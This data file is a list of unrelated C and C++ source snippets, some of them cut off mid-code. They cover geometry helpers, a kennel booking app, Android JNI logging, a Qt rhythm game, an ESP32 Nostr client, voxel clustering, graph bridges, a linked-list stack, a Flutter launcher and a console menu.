    "#include \"Mathematics/Triangle.hpp\"\n\nbrn::Vector3 brn::Triangle::calculateNormal()\n{\n    Vector3 tangent = {\n        vertices[0].x - vertices[1].x,\n        vertices[0].y - vertices[1].y,\n        vertices[0].z - vertices[1].z\n    };\n    Vector3 bitangent = {\n        vertices[2].x - vertices[1].x,\n        vertices[2].y - vertices[1].y,\n        vertices[2].z - vertices[1].z\n    };\n    return Vector3{\n        tangent.y * bitangent.z - tangent.z * bitangent.y,\n        tangent.z * bitangent.x - tangent.x * bitangent.z,\n        tangent.x * bitangent.y - tangent.y * bitangent.x\n    };\n}\n\n// bool brn::Triangle::isPointInTriangle(const Vector2i& point) const\n// {\n//     for (int i = 0; i < 3; i++)\n//     {\n//         Vector2i edgeVector = {(int)vertices[(i + 1) % 3].x - (int)vertices[i].x, (int)vertices[(i + 1) % 3].y - (int)vertices[i].y};\n//         Vector2i pointVector = {point.x - (int)vertices[i].x, point.y - (int)vertices[i].y};\n\n//         int crossProduct = edgeVector.x * pointVector.y - pointVector.x * edgeVector.y;\n//         if (crossProduct < 0)\n//             return false;\n//     }\n//     return true;\n// }",
    "#include <iostream>\n#include <ctime>\n#include <iomanip>\n#include \"Kennel.h\"\n#include \"Dog.h\"\n#include \"Cat.h\"\nusing namespace std;\n\ntime_t getCurrentTime() {\n    return time(0);\n}\n\ntime_t addDaysToTime(time_t startTime, int days) {\n    return startTime + (days * 24 * 60 * 60); // Add days in seconds\n}\n\nstring formatTime(time_t time) {\n    struct tm * timeinfo = localtime(&time);\n    char buffer[80];\n    strftime(buffer, 80, \"%Y-%m-%d\", timeinfo);\n    return string(buffer);\n}\n\nvoid displayMenu() {\n    cout << \"\\nKennel Booking System Menu:\" << endl;\n    cout << \"1. Add Animal\" << endl;\n    cout << \"2. Make Booking\" << endl;\n    cout << \"3. List Animals\" << endl;\n    cout << \"4. List Current Bookings\" << endl;\n    cout << \"5. Complete Booking\" << endl;\n    cout << \"6. Save Bookings to File\" << endl;\n    cout << \"7. Load Bookings from File\" << endl;\n    cout << \"8. Pay for Booking\" << endl;\n    cout << \"9. Exit\" << endl;\n    cout << \"Enter your choice: \";\n}\n\nint main() {\n    Kennel kennel(10);\n    int choice;\n    bool running = true;\n\n    while (running) {\n        displayMenu();\n        cin >> choice;\n\n        switch (choice) {\n            case 1: {\n                string type, name, size, furColor;\n                int age;\n                while (true) {\n                    cout << \"Enter animal type (Dog/Cat): \";\n                    cin >> type;\n                    if (type == \"Dog\" || type == \"Cat\") {\n                        break;\n                    } else {\n                        cout << \"Invalid animal type! Please enter 'Dog' or 'Cat'.\" << endl;\n                    }\n                }\n                cout << \"Enter name: \";\n                cin >> name;\n                cout << \"Enter age: \";\n                cin >> age;\n                while (true) {\n                    cout << \"Enter size (small/medium/large): \";\n                    cin >> size;\n                    if (size == \"small\" || size == \"medium\" || size == \"large\") {\n                        break;\n                    } else {\n                        cout << \"Invalid size! Please enter 'small', 'medium', or 'large'.\" << endl;\n                    }\n                }\n                cout << \"Enter fur color: \";\n                cin >> furColor;\n\n                shared_ptr<Animal> animal;\n                if (type == \"Dog\") {\n                    animal = make_shared<Dog>(name, age, size, furColor);\n                } else if (type == \"Cat\") {\n                    animal = make_shared<Cat>(name, age, size, furColor);\n                }\n\n                if (kennel.checkInAnimal(animal)) {\n                    cout << \"Animal checked in successfully!\" << endl;\n                } else {\n                    cout << \"Kennel is full. Cannot check in animal.\" << endl;\n                }\n                break;\n            }\n            case 2: {\n                string name;\n                int days;\n                cout << \"Enter animal name: \";\n                cin >> name;\n\n                shared_ptr<Animal> animal = nullptr;\n                for (auto& a : kennel.listAnimals()) {\n                    if (a->getName() == name) {\n                        animal = a;\n                        break;\n                    }\n                }\n\n                if (animal == nullptr) {\n                    cout << \"Animal not found!\" << endl;\n                    break;\n                }\n\n                cout << \"Enter number of days: \";\n                cin >> days;\n\n                time_t startDate = getCurrentTime();\n                time_t endDate = addDaysToTime(startDate, days);\n                shared_ptr<Booking> booking = make_shared<Booking>(animal, startDate, endDate);\n                kennel.addBooking(booking);\n                cout << \"Booking created successfully!\" << endl;\n                cout << animal->getName() << \" will be in the kennel until \" << formatTime(endDate) << \".\" << endl;\n                break;\n            }\n            case 3: {\n                cout << \"Animals in the kennel:\" << endl;\n                for (auto& animal : kennel.listAnimals()) {\n                    cout << \"Name: \" << animal->getName()\n                         << \", Type: \" << animal->getSpecies()\n                         << \", Age: \" << animal->getAge()\n                         << \", Size: \" << animal->getSize()\n                         << \", Fur Color: \" << animal->getFurColor() << endl;\n                }\n                break;\n            }\n            case 4: {\n                cout << \"Current Bookings:\" << endl;\n                vector<shared_ptr<Booking>> currentBookings = kennel.listCurrentBookings();\n                for (auto& booking : currentBookings) {\n                    time_t startDate = booking->getStartDate();\n                    time_t endDate = booking->getEndDate();\n                    cout << \"Animal: \" << booking->getAnimal()->getName()\n                         << \", Start Date: \" << formatTime(startDate)\n                         << \", End Date: \" << formatTime(endDa",
    "#include <jni.h>\n#include <string>\n#include \"Person.h\"\n#include <android/log.h>\n/*\n* C++ File\n*      \u2705 1. Received Int, Print it\n*      \u2705 2. Received String, Print it\n*      \u2705 3. Received Float, Print it\n*      \u2705 4. Received Char, Print it\n*      \u2705 5. Received Array, Print it\n*      \u2705 6. Received Object, Print it\n*/\n\nextern \"C\" JNIEXPORT void JNICALL Java_com_programming_cmaketest_MainActivity_receivedInt(JNIEnv* env, jobject thiz, jint num) {\n    __android_log_print(ANDROID_LOG_DEBUG, \"Received\",\"Received Int: %d\", num);\n}\n\nextern \"C\" JNIEXPORT void JNICALL Java_com_programming_cmaketest_MainActivity_receivedString(JNIEnv* env, jobject, jstring name) {\n    const char* nativeName = env->GetStringUTFChars(name, JNI_FALSE);\n    __android_log_print(ANDROID_LOG_DEBUG, \"Received\",\"Received String: %s\", nativeName);\n}\n\nextern \"C\" JNIEXPORT void JNICALL Java_com_programming_cmaketest_MainActivity_receivedFloat(JNIEnv* env, jobject, jfloat num) {\n    __android_log_print(ANDROID_LOG_DEBUG, \"Received\",\"Received Float: %f\", num);\n}\n\nextern \"C\" JNIEXPORT void JNICALL Java_com_programming_cmaketest_MainActivity_receivedChar(JNIEnv* env, jobject, jchar ch) {\n    __android_log_print(ANDROID_LOG_DEBUG, \"Received\",\"Received Char : %c\", ch);\n}\n\n\nextern \"C\" JNIEXPORT void JNICALL Java_com_programming_cmaketest_MainActivity_receivedList(JNIEnv* env, jobject /* this */, jintArray array) {\n\n    jsize length = env->GetArrayLength(array);\n    jint* elements = env->GetIntArrayElements(array, nullptr);\n\n    for (int i = 0; i < length; ++i) {\n        __android_log_print(ANDROID_LOG_DEBUG, \"Received\", \"Array [%d]: %d\", i, elements[i]);\n    }\n    env->ReleaseIntArrayElements(array, elements, JNI_ABORT);\n}\n\n\nextern \"C\" JNIEXPORT void JNICALL Java_com_programming_cmaketest_MainActivity_receivedPerson(JNIEnv* env, jobject /* this */, jobject personObj) {\n\n    jclass personClass = env->GetObjectClass(personObj);\n\n    jfieldID ageField = env->GetFieldID(personClass, \"age\", \"I\");\n    jint age = env->GetIntField(personObj, ageField);\n\n    jfieldID nameField = env->GetFieldID(personClass, \"name\", \"Ljava/lang/String;\");\n    jstring name = (jstring) env->GetObjectField(personObj, nameField);\n\n    const char* nativeName = env->GetStringUTFChars(name, JNI_FALSE);\n\n\n    __android_log_print(ANDROID_LOG_DEBUG, \"Received\", \"Received Person object: Age=%d, Name=%s\", age, nativeName);\n\n    // Release JNI resources\n    env->ReleaseStringUTFChars(name, nativeName);\n}",
    "//\n// Created by Frankoxer on 24-7-6.\n//\n\n#include \"GameApp.h\"\n#include <stdio.h>\n#include <filesystem>\n#include <utility>\n\nvoid GameApp::Init() {\n\n    auto *selectWindow = new SelectWindow();\n\n    connect(selectWindow, &SelectWindow::startGame, this, &GameApp::startplay);\n\n    std::vector<QString> songs;\n\n    for (const auto& entry : std::filesystem::directory_iterator(\"../resources/charts\")) {\n        if (entry.is_regular_file()) { // \u4e0d\u542b\u540e\u7f00\u540d\n            songs.push_back(QString::fromStdString(entry.path().stem().string()));\n        }\n    }\n    selectWindow->setList(songs);\n    selectWindow->show();\n}\n\nvoid GameApp::startplay(QString song) {\n\n    MainWindow *mainWindow = new MainWindow();\n    ViewModel *viewModel = new ViewModel();\n    std::cout << song.toStdString() << std::endl;\n    std::string songPath = song.toStdString();\n\n    connect(viewModel, &ViewModel::updateNoteView, mainWindow, &MainWindow::updateNotes);\n    connect(viewModel, &ViewModel::updateScore, mainWindow, &MainWindow::updateScore);\n    connect(viewModel, &ViewModel::updateCombo, mainWindow, &MainWindow::updateCombo);\n    connect(viewModel, &ViewModel::createBackground, mainWindow, &MainWindow::createBackground);\n    connect(viewModel, &ViewModel::createTracks, mainWindow, &MainWindow::createTracks);\n    connect(viewModel, &ViewModel::createTitleBlock, mainWindow, &MainWindow::createScoreTitleBlock);\n    connect(viewModel, &ViewModel::createJudgementLine, mainWindow, &MainWindow::createJudgementLine);\n    connect(viewModel, &ViewModel::playtapsound, mainWindow, &MainWindow::playtapsound);\n    connect(viewModel, &ViewModel::showSettlement, mainWindow, &MainWindow::showResults);\n    connect(mainWindow, &MainWindow::key0Pressed, viewModel, &ViewModel::dIsPressed);\n    connect(mainWindow, &MainWindow::key1Pressed, viewModel, &ViewModel::fIsPressed);\n    connect(mainWindow, &MainWindow::key2Pressed, viewModel, &ViewModel::jIsPressed);\n    connect(mainWindow, &MainWindow::key3Pressed, viewModel, &ViewModel::kIsPressed);\n    connect(mainWindow, &MainWindow::key0Released, viewModel, &ViewModel::dIsReleased);\n    connect(mainWindow, &MainWindow::key1Released, viewModel, &ViewModel::fIsReleased);\n    connect(mainWindow, &MainWindow::key2Released, viewModel, &ViewModel::jIsReleased);\n    connect(mainWindow, &MainWindow::key3Released, viewModel, &ViewModel::kIsReleased);\n\n    viewModel->initialize(songPath);\n    mainWindow->show();\n    mainWindow->setActiveNotes(viewModel->getActiveNotes());\n    // delete selectWindow;\n    viewModel->play();\n}",
    "#include \"ArduinoJson.h\"\n#include \"NostrEvent.h\"\n#include \"NostrPool.h\"\n#include \"Transport.h\"\n#include \"Utils.h\"\n#include \"esp32/ESP32Platform.h\"\n#include \"time.h\"\n\n#define WIFI_SSID \"Wokwi-GUEST\"\n#define WIFI_PASS \"\"\n#define WIFI_CHANNEL 6\n\n#define RELAY \"wss://nostr.rblb.it:7777\"\n\nstd::vector<nostr::NostrPool *> pools;\nvoid testNIP01Filter();\n\nvoid setup() {\n    ////////////////////////\n    /// INITIALIZATION\n    ///   Note: you need some form of this code in your sketch\n    ///         or the library will not work properly.\n    ///         If you don't know what to do, just copy this code.\n    ///         If you are initializing time and wifi somewhere else in your\n    ///         code, you can just omit the related lines here and call only\n    ///         initNostr\n    ////////////////////////\n    Serial.begin(115200);\n\n    Serial.println(\"Init wifi\");\n    nostr::esp32::ESP32Platform::initWifi(WIFI_SSID, WIFI_PASS, WIFI_CHANNEL);\n\n    Serial.println(\"Init time\");\n    nostr::esp32::ESP32Platform::initTime(\"pool.ntp.org\");\n\n    Serial.println(\"Init Nostr\");\n    nostr::esp32::ESP32Platform::initNostr(true);\n\n    Serial.println(\"Ready!\");\n\n    ////////////////////////\n    /// END OF INITIALIZATION\n    ////////////////////////\n\n    testNIP01Filter();\n}\n\nvoid loop() {    \n    for (nostr::NostrPool *pool : pools) {\n        pool->loop();\n    }\n}\n\nnostr::Transport *transport;\n\nvoid testNIP01Filter() {\n    try{\n        String relay = RELAY;\n        transport = nostr::esp32::ESP32Platform::getTransport();\n        nostr::NostrPool *pool = new nostr::NostrPool(transport);\n        pools.push_back(pool);\n        String subId = pool->subscribeMany(\n            {relay},\n            {{\n                {\"kinds\", {\"1\"}},\n                {\"since\", {\"1626023056\"}},\n                {\"until\", {\"1846947856\"}},\n                {\"limit\", {\"10\"}},\n                // Filters defined in NIP01 are automatically converted to the correct type\n                // however this library support non-NIP01 filters as well, but you might need to \n                // specify their type manually, if unspecified the code assumes string[]:\n                // eg. {\"int newFilter\", {\"1\"}}\n                // eg. {\"int[] newFilter2\", {\"1\", \"2\"}}\n                // eg. {\"float newFilter3\", {\"1.1\"}}\n                // eg. {\"float[] newFilter4\", {\"1.1\", \"2.2\"}}\n                // eg. {\"string newFilter5\", {\"hello\"}}\n            }},\n            [&](const String &subId, nostr::SignedNostrEvent *event) {               \n                JsonDocument doc;\n                JsonArray arr = doc[\"data\"].to<JsonArray>();\n                event->toSendableEvent(arr);\n                String json;\n                serializeJson(arr, json);\n                Serial.println(\"Event received: \" + json);\n            },\n            [&](const String &subId, const String &reason) { Serial.println(\"Subscription closed: \" + reason); }, [&](const String &subId) { Serial.println(\"Subscription EOSE: \" + subId); });\n    } catch (const std::exception &e) {\n        Serial.println(\"Error: \" + String(e.what()));\n    }\n}\n",
    "#include \"VoxEM.h\"\n#include \"Registration.h\"\nint main(int argc, char* argv[]) {\n\t\n\tVoxEM voxem;\n    std::string mrc_inputname = argv[1];\n\tstd::string sample_file = argv[2];\n\tfloat threshold = std::stof(argv[3]);\n\tstd::string file_outputname = argv[4];\n    voxem.IO_ReadMrc(mrc_inputname, \"Default\", \"\", \"Default\", \"Default\", true);\t\n    voxem.Voxel_Prune_RangeZero(threshold, -1.0, \"Default\", \"Voxel\");\n\n    std::vector<std::vector<std::vector<float>>> vox = voxem.getVoxelWorkspace(\"Voxel\");\n    std::array<int, 3> start;\n    if (std::any start_any = voxem.getDescriptionWorkspace(\"Default\")[\"Start\"]; start_any.has_value() && start_any.type() == typeid(std::array<int, 3>)) {\n        start = std::any_cast<std::array<int, 3>>(start_any);\n    }\n    std::array<float, 3> origin;\n    if (std::any origin_any = voxem.getDescriptionWorkspace(\"Default\")[\"Origin\"]; origin_any.has_value() && origin_any.type() == typeid(std::array<float, 3>)) {\n        origin = std::any_cast<std::array<float, 3>>(origin_any);\n    }\n    std::array<float, 3> vox_length;\n    if (std::any vox_length_any = voxem.getDescriptionWorkspace(\"Default\")[\"Angstrom\"]; vox_length_any.has_value() && vox_length_any.type() == typeid(std::array<float, 3>)) {\n        vox_length = std::any_cast<std::array<float, 3>>(vox_length_any);\n    }\n    std::array<float, 3> vox_ang = {vox_length[0] / static_cast<float>(vox.size()), vox_length[1] / static_cast<float>(vox[0].size()), vox_length[2] / static_cast<float>(vox[0][0].size())};\n\n    \n    std::vector<std::array<float, 3>> sample_points;\n    std::vector<std::array<float, 3>> sample_vector;\n    std::vector<std::array<float, 1>> density_list;\n    std::tie(sample_points, sample_vector, density_list) = voxem.load_sample_points(sample_file, false);\n\n    std::array<float, 3> shifting = {\n        start[0] * vox_ang[0] + origin[0],\n        start[1] * vox_ang[1] + origin[1],\n        start[2] * vox_ang[2] + origin[2]\n    };\n\t// \u6253\u5370shifting\u6570\u7ec4\n    std::cout << \"Shifting: [\"\n              << shifting[0] << \", \"\n              << shifting[1] << \", \"\n              << shifting[2] << \"]\" << std::endl;\n    for (auto& point : sample_points) {\n        point[0] -= shifting[0];\n        point[1] -= shifting[1];\n        point[2] -= shifting[2];\n    }\n    voxem.setPointWorkspaceValue(\"sample\", sample_points);\n\tstd::vector<float> sample_values = voxem.getPointWorkspaceValue(\"sample\");\t\n\t\n\tstd::cout << \"sample_points_transposed shape: (\" << sample_points.size() << \", \" << sample_points[0].size() << \")\" << std::endl;\n\tvoxem.Point_Create_Meanshift_sample(\n    threshold, // lower_bound\n    17,        // window\n    3.0,       // bandwidth\n    2000,      // iteration\n    0.05,      // step_size\n    0.000187,  // convergence\n    \"Voxel\",   // voxel_inputname\n    \"Meanshift\", // point_outputname\n    \"sample\"   // point_inputname\n    // description_inputname \u4f7f\u7528\u9ed8\u8ba4\u503c \"Default\"\n);\n\t\n\tvoxem.Point_Transform_DBSCAN(5.0 * 3, 3,\"Meanshift\", \"Meanshift\",false);\n\tvoxem.Point_Transform_DBSCAN(5.0, 3, \"Meanshift\", \"DBSCAN\",true,100);\n\t\n\t\n\tvoxem.IO_WriteXYZ(\"DBSCAN\",file_outputname,\"H\",shifting);\n\tstd::cout << \"Sampling and clustering success\" << std::endl;\n\t\n\t\n\t\n    return 0;\n}\n",
    "using namespace std;\n#include <bits/stdc++.h>\n#define all(v) v.begin(), v.end()\n#define ff first\n#define ss second\n#define pb push_back\n#define forx(i,n) for(int i=0; i<(int)n; ++i)\n#define printF(x) for(auto &w : x) {cout << w << \" \";} cout << endl;\ntypedef long long ll;\ntypedef long double ld;\ntypedef vector<int> vi;\ntypedef vector<long long> vl;\ntypedef vector<vl> vvl;\ntypedef pair<ll,ll> pll;\ntypedef pair<int,int> pii;\ntypedef priority_queue<ll> pqll;\nconst char ln = '\\n';\nconst int MOD = 1e9+7;\nconst ll inf  = 1e18;\nconst string abc = \"abcdefghijklmnopqrstuvwxyz\";\nint dirx[4] = {0,-1,1,0};\nint diry[4] = {-1,0,0,1};\n\nvvl graf;\nvl tin, low, vis0;\nll tim;\nset<pll> bridges;\n\nvoid dfsB(ll u, ll p = -1){\n    vis0[u] = 1;\n    tin[u] = low[u] = tim++;\n\n    for(int v : graf[u]){\n        // no tenemos en cuenta multi-edges\n        if (v == p) continue;\n\n        if (vis0[v]) low[u] = min(low[u], tin[v]);\n        else{\n            dfsB(v, u);\n            low[u] = min(low[u], low[v]);\n            if (tin[u] < low[v]){\n                bridges.insert({u, v});\n                bridges.insert({v, u});\n            }\n        }\n    }\n}\n\nvoid findBridges(ll n){\n    bridges.clear();\n    tin.assign(n, -1);\n    low.assign(n, -1);\n    vis0.assign(n, 0);\n    tim = 0;\n\n    for(int i = 0; i < n; i++){\n        if (!vis0[i]) dfsB(i);\n    }\n}\n\n\nint main() {\n    ios::sync_with_stdio(false); cin.tie(0);\n    cout << setprecision(20)<< fixed;\n    // freopen(\"file.in\", \"r\", stdin);\n    // freopen(\"file.out\", \"w\", stdout);\n\n    ll t; cin >> t;\n    while(t--){\n        ll n, m; cin >> n >> m;\n        \n        graf.assign(n, vl());\n        forx(i, m){\n            ll u, v; cin >> u >> v;\n            u--; v--;\n            graf[u].pb(v);\n            graf[v].pb(u);\n        }\n\n        findBridges(n);\n\n    }\n}",
    "#include <iostream> \n\nvoid push();  \nvoid pop();  \nvoid display();  \n\nstruct node   \n{  \n    int val;  \n    struct node *next;  \n};  \n\nstruct node *head;  \n  \nvoid main ()  \n{  \n    int choice = 0;     \n    std::cout << \"\\n*********Stack operations using linked list*********\\n\";  \n    std::cout << \"\\n----------------------------------------------\\n\";  \n    while(choice != 4)  \n    {  \n        std::cout << \"\\n\\nChose one from the below options...\\n\";  \n        std::cout << \"\\n1.Push\\n2.Pop\\n3.Show\\n4.Exit\";  \n        std::cout << \"\\n Enter your choice \\n\";        \n        std::cin >> choice;  \n        switch(choice)  \n        {  \n            case 1:  \n            {   \n                push();  \n                break;  \n            }  \n            case 2:  \n            {  \n                pop();  \n                break;  \n            }  \n            case 3:  \n            {  \n                display();  \n                break;  \n            }  \n            case 4:   \n            {  \n                printf(\"Exiting....\");  \n                break;   \n            }  \n            default:  \n            {  \n                printf(\"Please Enter valid choice \");  \n            }   \n    };  \n}  \n}  \nvoid push ()  \n{  \n    int val;  \n    struct node *ptr = new node();   \n    if(ptr == nullptr)  \n    {  \n        std::cout << \"not able to push the element\";   \n    }  \n    else   \n    {  \n        std::cout << \"Enter the value\";  \n        std::cin >> val;  \n        if(head==NULL)  \n        {         \n            ptr->val = val;  \n            ptr -> next = NULL;  \n            head=ptr;  \n        }   \n        else   \n        {  \n            ptr->val = val;  \n            ptr->next = head;  \n            head=ptr;  \n               \n        }  \n        std::cout << \"Item pushed\";  \n          \n    }  \n}  \n  \nvoid pop()  \n{  \n    int item;  \n    struct node *ptr;  \n    if (head == nullptr)  \n    {  \n        std::cout << \"Underflow\";  \n    }  \n    else  \n    {  \n        item = head->val;  \n        ptr = head;  \n        head = head->next;  \n        delete ptr;  \n        std::cout << \"Item popped\";  \n          \n    }  \n}  \nvoid display()  \n{  \n    int i;  \n    struct node *ptr;  \n    ptr=head;  \n    if(ptr == nullptr)  \n    {  \n        std::cout << \"Stack is empty\\n\";  \n    }  \n    else  \n    {  \n        std::cout << \"Printing Stack elements \\n\";  \n        while(ptr != nullptr)  \n        {  \n            std::cout << \"\\n\" << ptr->val;  \n            ptr = ptr->next;  \n        }  \n    }  \n}  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"spotify_ui\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include \"stdafx.h\" //\u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\r\n#include <stdio.h> \r\n#include <stdlib.h> \r\n#include <conio.h> \r\n#include <string.h> \r\n#include <malloc.h> \r\n#include <clocale> \r\n \r\nusing namespace std; \r\nusing namespace System; \r\nusing namespace System::IO; \r\n \r\n#define ENTER 13 //\u043e\u0431\u043e\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043e\u043a\r\n#define ESC 27 \r\n#define UP 72 \r\n#define DOWN 80 \r\n#define HOME 71\r\n#define END 79\r\n \r\nchar dan[9][55]=\r\n{ \r\n \"\u041a\u0430\u043a\u043e\u0439 \u0438\u0437\u0434\u0430\u0442\u0435\u043b\u044c \u0438\u043c\u0435\u0435\u0442 \u043d\u0430\u0438\u043c\u0435\u043d\u044c\u0448\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0440\u043e\u0434\u0430\u0436?    \",\r\n \"\u0418\u0433\u0440\u0430 \u043a\u0430\u043a\u043e\u0433\u043e \u0438\u0437\u0434\u0430\u0442\u0435\u043b\u044f \u0432\u044b\u0448\u043b\u0430 \u0440\u0430\u043d\u044c\u0448\u0435?                    \",\r\n \"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u043f\u0443\u043b\u044f\u0440\u043d\u044b\u0445 \u0438\u0433\u0440, \u0434\u043e\u0440\u043e\u0436\u0435 2000 \u0440.             \",\r\n \"\u0421\u043f\u0438\u0441\u043e\u043a \u0438\u0437\u0434\u0430\u0442\u0435\u043b\u0435\u0439 \u043f\u043e \u0430\u043b\u0444\u0430\u0432\u0438\u0442\u0443.                         \",\r\n \"\u0421\u043f\u0438\u0441\u043e\u043a \u0438\u0437\u0434\u0430\u0442\u0435\u043b\u0435\u0439 \u043f\u0440\u043e\u0442\u0438\u0432 \u0430\u043b\u0444\u0430\u0432\u0438\u0442\u0430.                     \",\r\n \"\u0414\u0438\u0430\u0433\u0440\u0430\u043c\u043c\u0430,\u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043d\u043e\u0435 \u0441\u043e\u043e\u0442\u043d\u043e\u0448\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0434\u0430\u043d\u043d\u044b\u0445 \u043a\u043e\u043f\u0438\u0439 \u0438\u0433\u0440. \",\r\n \"\u0421\u043f\u0438\u0441\u043e\u043a \u0438\u0433\u0440 \u0441 \u0432\u0432\u043e\u0434\u043e\u043c \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0439 \u0446\u0435\u043d\u044b \u0438 \u043a\u043e\u043b-\u0432\u043e\u043c \u043f\u0440\u043e\u0434\u0430\u0436.\",\r\n \"\u0415\u0441\u0442\u044c \u043b\u0438 \u0443 \u0440\u0430\u0437\u043d\u044b\u0445 \u0438\u0437\u0434\u0430\u0442\u0435\u043b\u0435\u0439 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u043e\u0432\u0435 \u043a\u043e\u043b-\u0432\u043e \u043f\u0440\u043e\u0434\u0430\u0436? \", \r\n \"\u0412\u044b\u0445\u043e\u0434                                                 \" \r\n}; //\u0437\u0430\u0434\u0430\u043d\u0438\u0435 \u0441\u043f\u0438\u0441\u043a\u0430 \u0432\u043e\u043f\u0440\u043e\u0441\u043e\u0432 - \u043f\u0443\u043d\u043a\u0442\u043e\u0432 \u043c\u0435\u043d\u044e\r\nchar BlankLine[ ]= \"                                                        \"; \r\n \r\n \r\n \r\nint menu(int n) \r\n{ \r\n int y1=0,y2=n-1; \r\n char c=1; \r\n while (c!=ESC) //\u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043a\u043d\u043e\u043f\u043a\u0438 ESC, \u043c\u0435\u043d\u044e \u0437\u0430\u043a\u0440\u043e\u0435\u0442\u0441\u044f\r\n { \r\n switch(c) { \r\n  case DOWN: y2=y1; y1++; break; /*\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 DOWN,\r\n\t\t\t\t\t\t\t\t\u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0430\u0442\u044c\u0441\u044f \u0432\u043d\u0438\u0437 \u043f\u043e \u043c\u0435\u043d\u044e*/\r\n  case UP: y2=y1; y1--; break; /*\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 UP,\r\n\t\t\t\t\t\t\t\t\u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u0435\u0440\u0435\u0449\u0430\u0442\u044c\u0441\u044f \u0432\u0432\u0435\u0440\u0445 \u043f\u043e \u043c\u0435\u043d\u044e*/\r\n  case END: y2=y1; y1=n-1; break; /*\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 END,\r\n\t\t\t\t\t\t\t\t\u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0430\u0442\u044c\u0441\u044f \u0441\u0430\u043c\u044b\u0439 \u043d\u0438\u0437 \u043c\u0435\u043d\u044e*/\r\n  case HOME: y2=y1; y1=0; break; /*\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 HOME,\r\n\t\t\t\t\t\t\t\t\u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0430\u0442\u044c\u0441\u044f \u0441\u0430\u043c\u044b\u0439 \u0432\u0435\u0440\u0445 \u043c\u0435\u043d\u044e*/\r\n  case ENTER: return y1+1; /*\u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 ENTER,\r\n\t\t\t\t\t\t\t \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0432\u044b\u0431\u0440\u0430\u0442\u044c \u0432\u043e\u043f\u0440\u043e\u0441*/\r\n \r\n } \r\n if(y1>n-1){y2=n-1;y1=0;}  //\u0443\u0441\u043b\u043e\u0432\u0438\u0435,\u043a\u043e\u0433\u0434\u0430 \u0441\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u0442 \u043a\u043d\u043e\u043f\u043a\u0430 Down\r\n if(y1<0)  {y2=0;y1=n-1;}  //\u0443\u0441\u043b\u043e\u0432\u0438\u0435,\u043a\u043e\u0433\u0434\u0430 \u0441\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u0442 \u043a\u043d\u043e\u043f\u043a\u0430 UP\r\n Console::ForegroundColor=ConsoleColor::White; /*\u043f\u0440\u0438\u0432\u044b\u0431\u043e\u0440\u0435 \u0432\u043e\u043f\u0440\u043e\u0441\u0430,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\u0431\u0443\u043a\u0432\u044b \u043e\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u044e\u0442\u0441\u044f \u0432 \u0431\u0435\u043b\u044b\u0439 \u0446\u0432\u0435\u0442*/\r\n Console::BackgroundColor=ConsoleColor::Black; 